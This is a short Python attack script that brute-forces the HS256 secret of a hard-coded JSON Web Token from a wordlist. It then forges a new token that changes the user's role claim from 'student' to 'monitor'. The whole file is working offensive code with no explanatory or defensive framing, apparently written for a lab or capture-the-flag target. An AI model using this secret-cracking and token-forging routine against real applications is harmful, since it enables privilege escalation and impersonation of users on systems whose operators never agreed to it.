import jwt
from jwt.exceptions import InvalidSignatureError
import sys



def bruteforce_jwt(token: str, wordlist_path: str):
    header, payload, signature = token.split('.')
    
    with open(wordlist_path, 'r') as file:
        for line in file:
            secret = line.strip()
            try:
                decoded = jwt.decode(token, secret, algorithms=["HS256"])
                print(f"[+] Found secret: {secret}")
                print(f"[+] Payload: {decoded}")
                return secret
            except InvalidSignatureError:
                continue
            except Exception as e:
                print(f"[-] Error with {secret}: {e}")
    print("[-] Secret not found.")
    return None

def modify_jwt(secret: str, new_payload: dict[str, str]) -> str:
    new_token = jwt.encode(new_payload, secret, algorithm="HS256")
    print(f"[+] New token: {new_token}")
    
    return new_token

if __name__ == "__main__":
    
    # Your target JWT
    original_token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Ikp1YW4iLCJyb2xlIjoic3R1ZGVudCIsImV4cCI6MTc1MDkwMzI5Nn0.UwTWF4TMWxYnQZHGeZctDnuxVazSHWnLzS08rbpVVPg"

# Path to your wordlist of potential secrets
    wordlist_path = "3000_words.txt"
    
    secret = bruteforce_jwt(original_token, wordlist_path)
    if secret:
        new_payload = {'username': 'Juan', 'role': 'monitor', 'exp': 1750897279}
        modify_jwt(secret, new_payload)
